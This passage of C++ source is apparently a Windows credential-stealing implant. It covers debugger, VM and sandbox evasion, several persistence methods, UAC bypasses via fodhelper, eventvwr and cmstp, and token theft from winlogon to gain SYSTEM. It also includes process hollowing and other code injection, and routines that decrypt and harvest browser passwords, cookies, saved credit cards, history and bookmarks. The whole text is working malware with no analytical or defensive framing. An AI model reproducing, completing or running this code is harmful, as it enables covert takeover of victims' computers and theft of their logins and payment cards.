    PROCESS_BASIC_INFORMATION pbi{};
    if (NtQueryInformationProcess_wrapper(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength) == 0 && pbi.PebBaseAddress && pbi.PebBaseAddress->BeingDebugged) return true;
    if (pbi.PebBaseAddress) {
        DWORD ntGlobalFlag = *(DWORD*)((BYTE*)pbi.PebBaseAddress + 0x68);
        if (ntGlobalFlag & 0x70) return true;
        DWORD heapFlags = *(DWORD*)((BYTE*)pbi.PebBaseAddress + 0x18);
        if (heapFlags & 0x02) return true;
    }
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return true;
    }
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    __rdtsc();
    QueryPerformanceCounter(&end);
    if ((end.QuadPart - start.QuadPart) < 100) return true;
    if (FindWindowA(NULL, decrypt_str("}6;`bd", 1).c_str()) || FindWindowA(NULL, decrypt_str("Qn{rFbd", 3).c_str()) || FindWindowA(NULL, decrypt_str("KFE", 4).c_str())) return true;
    return false;
}

bool is_vm() {
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 0x40000000);
    char hypervisor_vendor[13] = {0};
    memcpy(hypervisor_vendor, &cpuInfo[1], 4);
    memcpy(hypervisor_vendor + 4, &cpuInfo[2], 4);
    memcpy(hypervisor_vendor + 8, &cpuInfo[3], 4);
    std::string hv(hypervisor_vendor);
    if (hv.find("VMware") != std::string::npos || hv.find("VBox") != std::string::npos || hv.find("Microsoft Hv") != std::string::npos || hv.find("KVM") != std::string::npos) return true;
    MEMORYSTATUSEX mem = {sizeof(mem)};
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
    SYSTEM_INFO sys;
    GetSystemInfo(&sys);
    if (sys.dwNumberOfProcessors < 2) return true;
    ULARGE_INTEGER freeSpace;
    GetDiskFreeSpaceExA(decrypt_str("D:\\", 3).c_str(), &freeSpace, NULL, NULL);
    if (freeSpace.QuadPart < 10ULL * 1024 * 1024 * 1024) return true;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = {sizeof(pe)};
        if (Process32First(hSnapshot, &pe)) {
            do {
                std::wstring name = pe.szExeFile;
                std::transform(name.begin(), name.end(), name.begin(), ::towlower);
                if (name.find(L"vmtoolsd") != std::string::npos || name.find(L"vbox") != std::string::npos || name.find(L"xenservice") != std::string::npos) {
                    NtClose_wrapper(hSnapshot); return true;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        NtClose_wrapper(hSnapshot);
    }
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t buf[256]; DWORD size = sizeof(buf);
        if (RegQueryValueExW(hKey, L"0", NULL, NULL, (LPBYTE)buf, &size) == ERROR_SUCCESS) {
            std::wstring val(buf);
            if (val.find(L"VMWARE") != std::string::npos || val.find(L"VBOX") != std::string::npos) {
                RegCloseKey(hKey); return true;
            }
        }
        RegCloseKey(hKey);
    }
    return false;
}

bool is_sandbox() {
    if (GetModuleHandleA(decrypt_str("tcn`mh+enn", 1).c_str())) return true;
    if (GetModuleHandleA(decrypt_str("tcn`mh`rt+enn", 1).c_str())) return true;
    if (GetModuleHandleA(decrypt_str("v`whf+enn", 1).c_str())) return true;
    if (GetModuleHandleA(decrypt_str("nrl`vf`+enn", 1).c_str())) return true;
    if (FindWindowA(NULL, decrypt_str("OLLYDBG", 3).c_str())) return true;
    if (FindWindowA(NULL, decrypt_str("x64dbg", 4).c_str())) return true;
    if (FindWindowA(NULL, decrypt_str("WinDbg", 5).c_str())) return true;
    if (FindWindowA(NULL, decrypt_str("Immunity Debugger", 6).c_str())) return true;
    POINT pt;
    GetCursorPos(&pt);
    if (pt.x == 0 && pt.y == 0) return true;
    if (GetTickCount64() < 60000) return true;
    return false;
}

void anti_debug_loop() {
    while (g_running) {
        if (is_debugged() || is_vm() || is_sandbox()) {
            for (;;) { NtDelayExecution_wrapper(FALSE, (PLARGE_INTEGER)&(LARGE_INTEGER){.QuadPart = -10000000}); }
        }
        NtDelayExecution_wrapper(FALSE, (PLARGE_INTEGER)&(LARGE_INTEGER){.QuadPart = -1000000});
    }
}

void hide_thread_from_debugger() {
    HANDLE hThread = GetCurrentThread();
    NtSetInformationThread_wrapper(hThread, ThreadHideFromDebugger, NULL, 0);
}

void ekko_sleep(DWORD ms) {
    if (!g_payload_plain.empty() && !g_payload_cipher.empty()) {
        std::lock_guard<std::mutex> lock(g_sleep_mutex);
        g_payload_cipher = aes_gcm_encrypt(g_encryption_key, g_payload_plain);
        g_payload_plain.clear();
    }
    HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!hEvent) { Sleep(ms); return; }
    HANDLE hThread = GetCurrentThread();
    auto callback = [](ULONG_PTR Parameter) -> void { NtTestAlert_wrapper(); };
    for (DWORD i = 0; i < ms / 10; i++) {
        NtQueueApcThread_wrapper(hThread, (PVOID)callback, (ULONG_PTR)hEvent, 0, 0);
        NtTestAlert_wrapper();
        WaitForSingleObject(hEvent, 10);
    }
    NtClose_wrapper(hEvent);
    if (!g_payload_cipher.empty()) {
        std::lock_guard<std::mutex> lock(g_sleep_mutex);
        g_payload_plain = aes_gcm_decrypt(g_encryption_key, g_payload_cipher);
        g_payload_cipher.clear();
    }
}

void install_persistence_registry() {
    std::string key = random_string(8);
    std::wstring wkey = utf8_to_wstr(key);
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, wkey.c_str(), 0, REG_SZ, (const BYTE*)exePath, (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, wkey.c_str(), 0, REG_SZ, (const BYTE*)exePath, (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

void install_persistence_schtasks() {
    std::string key = random_string(8);
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring taskName = L"Microsoft\\Windows\\Update\\" + utf8_to_wstr(key);
    std::wstring cmd = L"schtasks /create /tn \"" + taskName + L"\" /tr \"" + exePath + L"\" /sc onlogon /ru SYSTEM /f";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    NtClose_wrapper(pi.hProcess);
    NtClose_wrapper(pi.hThread);
}

void install_persistence_service() {
    std::string name = random_string(8);
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring wname = utf8_to_wstr(name);
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (scm) {
        SC_HANDLE svc = CreateServiceW(scm, wname.c_str(), wname.c_str(), SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, exePath, NULL, NULL, NULL, NULL, NULL);
        if (svc) {
            StartServiceW(svc, 0, NULL);
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }
}

void install_persistence_wmi() {
    std::string name = random_string(8);
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring wname = utf8_to_wstr(name);
    std::wstring cmd = L"wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name=\"" + wname + L"\", EventNamespace='root\\cimv2', QueryLanguage='WQL', Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" && wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name=\"" + wname + L"\", CommandLineTemplate=\"" + exePath + L"\"";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    NtClose_wrapper(pi.hProcess);
    NtClose_wrapper(pi.hThread);
}

void install_persistence_startup_folder() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wchar_t startup[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startup))) {
        std::wstring dest = std::wstring(startup) + L"\\" + std::wstring(utf8_to_wstr(random_string(8))) + L".exe";
        CopyFileW(exePath, dest.c_str(), FALSE);
    }
}

void install_persistence_com_hijack() {
    std::string key = random_string(8);
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring wkey = utf8_to_wstr(key);
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\CLSID\\{373984A9-B845-449B-91E7-45ACF4E5FD75}\\LocalServer32", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)exePath, (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

void install_persistence() {
    install_persistence_registry();
    install_persistence_schtasks();
    install_persistence_service();
    install_persistence_wmi();
    install_persistence_startup_folder();
    install_persistence_com_hijack();
}

void uac_bypass_fodhelper() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring cmd = L"cmd /c start /min \"\" \"" + std::wstring(exePath) + L"\"";
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)cmd.c_str(), (DWORD)((cmd.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD dword = 0;
        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_DWORD, (const BYTE*)&dword, sizeof(dword));
        RegCloseKey(hKey);
    }
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"open";
    sei.lpFile = L"ms-settings:";
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);
}

void uac_bypass_eventvwr() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring cmd = L"cmd /c start /min \"\" \"" + std::wstring(exePath) + L"\"";
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\mscfile\\shell\\open\\command", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)cmd.c_str(), (DWORD)((cmd.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"open";
    sei.lpFile = L"eventvwr.exe";
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);
}

void uac_bypass_cmstp() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring infPath = std::wstring(_wgetenv(L"TEMP")) + L"\\" + utf8_to_wstr(random_string(8)) + L".inf";
    std::wstring infContent = L"[version]\nSignature=$chicago$\nAdvancedINF=2.5\n\n[DefaultInstall]\nCustomDestination=CustInstDestSectionAllUsers\nRunPreSetupCommands=RunPreSetupCommandsSection\n\n[RunPreSetupCommandsSection]\n\"" + std::wstring(exePath) + L"\"\ntaskkill /IM cmstp.exe /F\n\n[CustInstDestSectionAllUsers]\n49000,49001=AllUSer_LDIDSection, 7\n\n[AllUSer_LDIDSection]\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\n\n[Strings]\nServiceName=\"CorpVPN\"\nShortSvcName=\"CorpVPN\"\n";
    std::ofstream ofs(infPath);
    ofs << wstr_to_utf8(infContent);
    ofs.close();
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = L"cmstp.exe";
    sei.lpParameters = (L"/au " + infPath).c_str();
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);
    DeleteFileW(infPath.c_str());
}

void elevate_to_system() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, SE_IMPERSONATE_NAME, &luid)) { NtClose_wrapper(hToken); return; }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    NtClose_wrapper(hToken);
    DWORD pids[1024], cbNeeded;
    if (!EnumProcesses(pids, sizeof(pids), &cbNeeded)) return;
    DWORD numProcesses = cbNeeded / sizeof(DWORD);
    for (DWORD i = 0; i < numProcesses; i++) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pids[i]);
        if (hProcess) {
            wchar_t szName[MAX_PATH];
            DWORD size = MAX_PATH;
            if (QueryFullProcessImageNameW(hProcess, 0, szName, &size)) {
                std::wstring name = szName;
                std::transform(name.begin(), name.end(), name.begin(), ::towlower);
                if (name.find(L"winlogon.exe") != std::string::npos) {
                    HANDLE hTokenProcess;
                    if (NtOpenProcessToken_wrapper(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hTokenProcess) == 0) {
                        HANDLE hDupToken;
                        if (NtDuplicateToken_wrapper(hTokenProcess, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken) == 0) {
                            STARTUPINFOW si = { sizeof(si) };
                            PROCESS_INFORMATION pi;
                            wchar_t cmd[MAX_PATH];
                            GetSystemDirectoryW(cmd, MAX_PATH);
                            wcscat_s(cmd, L"\\cmd.exe");
                            if (CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, cmd, NULL, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                                NtClose_wrapper(pi.hProcess);
                                NtClose_wrapper(pi.hThread);
                            }
                            NtClose_wrapper(hDupToken);
                        }
                        NtClose_wrapper(hTokenProcess);
                    }
                    NtClose_wrapper(hProcess);
                    break;
                }
            }
            NtClose_wrapper(hProcess);
        }
    }
}

void inject_early_bird(const std::vector<uint8_t>& payload) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat_s(path, decrypt_str("\\xwhdrxy5gzg", 3).c_str());
    if (!CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return;
    LPVOID pRemote = VirtualAllocEx(pi.hProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemote) {
        WriteProcessMemory(pi.hProcess, pRemote, payload.data(), payload.size(), NULL);
        DWORD old;
        VirtualProtectEx(pi.hProcess, pRemote, payload.size(), PAGE_EXECUTE_READ, &old);
        QueueUserAPC((PAPCFUNC)pRemote, pi.hThread, 0);
        ResumeThread(pi.hThread);
    }
    NtClose_wrapper(pi.hThread);
    NtClose_wrapper(pi.hProcess);
}

void inject_process_hollowing(const std::vector<uint8_t>& payload) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat_s(path, decrypt_str("\\xwhdrxy5gzg", 3).c_str());
    if (!CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return;
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    PVOID pImageBase = NULL;
    NtQueryInformationProcess_wrapper(pi.hProcess, ProcessImageBaseAddress, &pImageBase, sizeof(pImageBase), NULL);
    NtUnmapViewOfSection_wrapper(pi.hProcess, pImageBase);
    LPVOID pRemote = VirtualAllocEx(pi.hProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemote) {
        WriteProcessMemory(pi.hProcess, pRemote, payload.data(), payload.size(), NULL);
        ctx.Rcx = (DWORD64)pRemote;
        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);
    }
    NtClose_wrapper(pi.hThread);
    NtClose_wrapper(pi.hProcess);
}

void inject_module_stomping(const std::vector<uint8_t>& payload) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (!Process32First(hSnapshot, &pe)) { NtClose_wrapper(hSnapshot); return; }
    DWORD targetPid = 0;
    do {
        std::wstring name = pe.szExeFile;
        std::transform(name.begin(), name.end(), name.begin(), ::towlower);
        if (name.find(L"svchost.exe") != std::string::npos) {
            targetPid = pe.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe));
    NtClose_wrapper(hSnapshot);
    if (!targetPid) return;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) return;
    HMODULE hMods[1024];
    DWORD cbNeeded;
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for (DWORD i = 0; i < cbNeeded / sizeof(HMODULE); i++) {
            MODULEINFO modInfo;
            if (GetModuleInformation(hProcess, hMods[i], &modInfo, sizeof(modInfo))) {
                if (modInfo.SizeOfImage > payload.size() * 2) {
                    DWORD old;
                    VirtualProtectEx(hProcess, modInfo.lpBaseOfDll, modInfo.SizeOfImage, PAGE_EXECUTE_READWRITE, &old);
                    WriteProcessMemory(hProcess, modInfo.lpBaseOfDll, payload.data(), payload.size(), NULL);
                    VirtualProtectEx(hProcess, modInfo.lpBaseOfDll, modInfo.SizeOfImage, old, &old);
                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)modInfo.lpBaseOfDll, NULL, 0, NULL);
                    if (hThread) NtClose_wrapper(hThread);
                    break;
                }
            }
        }
    }
    NtClose_wrapper(hProcess);
}

std::optional<std::vector<uint8_t>> get_master_key(const fs::path& local_state_path, const std::string& browser_name) {
    std::ifstream file(local_state_path);
    if (!file.is_open()) return std::nullopt;
    json data;
    try { file >> data; }
    catch (...) { return std::nullopt; }
    if (!data.contains("os_crypt") || !data["os_crypt"].contains("encrypted_key")) return std::nullopt;
    std::string enc_key_b64 = data["os_crypt"]["encrypted_key"];
    auto enc_key = base64_decode(enc_key_b64);
    if (enc_key.size() < 5) return std::nullopt;
    if (enc_key[0] == 0x01) {
        DATA_BLOB in, out;
        in.pbData = enc_key.data() + 5;
        in.cbData = (DWORD)enc_key.size() - 5;
        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
            std::vector<uint8_t> key(out.pbData, out.pbData + out.cbData);
            LocalFree(out.pbData);
            if (key.size() == 32) return key;
        }
    }
    return std::nullopt;
}

std::optional<std::string> decrypt_blob(const std::vector<uint8_t>& master_key, const std::vector<uint8_t>& encrypted_blob) {
    if (encrypted_blob.size() < 3 + 12 + 16) return std::nullopt;
    if (encrypted_blob[0] != 0x76 || encrypted_blob[1] != 0x31) return std::nullopt;
    std::vector<uint8_t> nonce(encrypted_blob.begin() + 3, encrypted_blob.begin() + 3 + 12);
    std::vector<uint8_t> ct(encrypted_blob.begin() + 3 + 12, encrypted_blob.end());
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return std::nullopt;
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL);
    EVP_DecryptInit_ex(ctx, NULL, NULL, master_key.data(), nonce.data());
    std::vector<uint8_t> plaintext(ct.size());
    int len = 0;
    EVP_DecryptUpdate(ctx, plaintext.data(), &len, ct.data(), (int)ct.size());
    int pLen = 0;
    EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &pLen);
    EVP_CIPHER_CTX_free(ctx);
    plaintext.resize(len + pLen);
    return std::string(plaintext.begin(), plaintext.end());
}

std::vector<fs::path> find_profiles(const fs::path& data_dir) {
    std::vector<fs::path> profiles;
    if (!fs::exists(data_dir)) return profiles;
    for (auto& entry : fs::directory_iterator(data_dir)) {
        if (entry.is_directory()) {
            std::string name = entry.path().filename().string();
            if (name == "Default" || name.find("Profile") != std::string::npos) {
                profiles.push_back(entry.path());
            }
        }
    }
    return profiles;
}

void write_entry(const json& entry) {
    std::lock_guard<std::mutex> lock(g_output_mutex);
    if (g_output_file.is_open()) {
        if (g_output_count > 0) g_output_file << ",\n";
        g_output_file << entry.dump();
        g_output_count++;
    }
    std::string type = entry.value("type", "unknown");
    if (g_global_json.contains(type)) {
        g_global_json[type].push_back(entry);
    } else {
        g_global_json[type] = json::array({entry});
    }
}

void extract_firefox_data(const fs::path& profile_path) {
    fs::path logins_file = profile_path / "logins.json";
    if (fs::exists(logins_file)) {
        std::ifstream f(logins_file);
        if (f.is_open()) {
            json data;
            try { f >> data; }
            catch (...) {}
            if (data.contains("logins")) {
                for (auto& login : data["logins"]) {
                    json entry;
                    entry["type"] = "firefox_login";
                    entry["hostname"] = login.value("hostname", "");
                    entry["username"] = login.value("username", "");
                    entry["password"] = login.value("password", "");
                    write_entry(entry);
                }
            }
        }
    }
    fs::path cookies_db = profile_path / "cookies.sqlite";
    if (fs::exists(cookies_db)) {
        sqlite3* db = nullptr;
        if (sqlite3_open_v2(cookies_db.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
            const char* query = "SELECT host, name, value FROM moz_cookies;";
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    json entry;
                    entry["type"] = "firefox_cookie";
                    entry["host"] = (const char*)sqlite3_column_text(stmt, 0);
                    entry["name"] = (const char*)sqlite3_column_text(stmt, 1);
                    entry["value"] = (const char*)sqlite3_column_text(stmt, 2);
                    write_entry(entry);
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
        }
    }
}

void extract_passwords(const fs::path& profile_dir, const std::vector<uint8_t>& master_key,
                       const std::string& browser_name, const std::string& profile_name) {
    fs::path login_db = profile_dir / "Login Data";
    if (!fs::exists(login_db)) return;
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(login_db.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return;
    const char* query = "SELECT origin_url, username_value, password_value, signon_realm FROM logins;";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) { sqlite3_close(db); return; }
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string url = (const char*)sqlite3_column_text(stmt, 0);
        std::string username = (const char*)sqlite3_column_text(stmt, 1);
        std::vector<uint8_t> encrypted_blob((uint8_t*)sqlite3_column_blob(stmt, 2), (uint8_t*)sqlite3_column_blob(stmt, 2) + sqlite3_column_bytes(stmt, 2));
        if (encrypted_blob.empty()) continue;
        auto decrypted = decrypt_blob(master_key, encrypted_blob);
        if (!decrypted) continue;
        json entry;
        entry["type"] = "password";
        entry["browser"] = browser_name;
        entry["profile"] = profile_name;
        entry["url"] = url;
        entry["username"] = username;
        entry["password"] = *decrypted;
        write_entry(entry);
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void extract_cookies(const fs::path& profile_dir, const std::vector<uint8_t>& master_key,
                     const std::string& browser_name, const std::string& profile_name) {
    fs::path cookie_db = profile_dir / "Network" / "Cookies";
    if (!fs::exists(cookie_db)) cookie_db = profile_dir / "Cookies";
    if (!fs::exists(cookie_db)) return;
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(cookie_db.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return;
    const char* query = "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies;";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) { sqlite3_close(db); return; }
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string host = (const char*)sqlite3_column_text(stmt, 0);
        std::string name = (const char*)sqlite3_column_text(stmt, 1);
        std::string path = (const char*)sqlite3_column_text(stmt, 2);
        std::vector<uint8_t> encrypted_blob((uint8_t*)sqlite3_column_blob(stmt, 3), (uint8_t*)sqlite3_column_blob(stmt, 3) + sqlite3_column_bytes(stmt, 3));
        if (encrypted_blob.empty()) continue;
        auto decrypted = decrypt_blob(master_key, encrypted_blob);
        if (!decrypted) continue;
        json entry;
        entry["type"] = "cookie";
        entry["browser"] = browser_name;
        entry["profile"] = profile_name;
        entry["host"] = host;
        entry["name"] = name;
        entry["path"] = path;
        entry["value"] = *decrypted;
        write_entry(entry);
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void extract_credit_cards(const fs::path& profile_dir, const std::vector<uint8_t>& master_key,
                          const std::string& browser_name, const std::string& profile_name) {
    fs::path web_db = profile_dir / "Web Data";
    if (!fs::exists(web_db)) return;
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(web_db.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return;
    const char* query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) { sqlite3_close(db); return; }
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string name = (const char*)sqlite3_column_text(stmt, 0);
        std::string exp_month = (const char*)sqlite3_column_text(stmt, 1);
        std::string exp_year = (const char*)sqlite3_column_text(stmt, 2);
        std::vector<uint8_t> encrypted_blob((uint8_t*)sqlite3_column_blob(stmt, 3), (uint8_t*)sqlite3_column_blob(stmt, 3) + sqlite3_column_bytes(stmt, 3));
        if (encrypted_blob.empty()) continue;
        auto decrypted = decrypt_blob(master_key, encrypted_blob);
        if (!decrypted) continue;
        json entry;
        entry["type"] = "credit_card";
        entry["browser"] = browser_name;
        entry["profile"] = profile_name;
        entry["name"] = name;
        entry["exp_month"] = exp_month;
        entry["exp_year"] = exp_year;
        entry["number"] = *decrypted;
        write_entry(entry);
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void extract_history(const fs::path& profile_dir, const std::string& browser_name, const std::string& profile_name) {
    fs::path history_db = profile_dir / "History";
    if (!fs::exists(history_db)) return;
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(history_db.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return;
    const char* query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500;";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) { sqlite3_close(db); return; }
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        json entry;
        entry["type"] = "history";
        entry["browser"] = browser_name;
        entry["profile"] = profile_name;
        entry["url"] = (const char*)sqlite3_column_text(stmt, 0);
        entry["title"] = (const char*)sqlite3_column_text(stmt, 1);
        entry["visits"] = sqlite3_column_int(stmt, 2);
        write_entry(entry);
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void extract_bookmarks(const fs::path& profile_dir, const std::string& browser_name, const std::string& profile_name) {
    fs::path bookmarks_file = profile_dir / "Bookmarks";
    if (!fs::exists(bookmarks_file)) return;
    std::ifstream file(bookmarks_file);
    if (!file.is_open()) return;
    json data;
    try { file >> data; }
    catch (...) { return; }
    if (!data.contains("roots")) return;
    std::function<void(const json&)> traverse = [&](const json& node) {
        if (node.contains("type") && node["type"] == "url" && node.contains("url") && node.contains("name")) {
            json entry;
            entry["type"] = "bookmark";
            entry["browser"] = browser_name;
            entry["profile"] = profile_name;
            entry["url"] = node["url"];
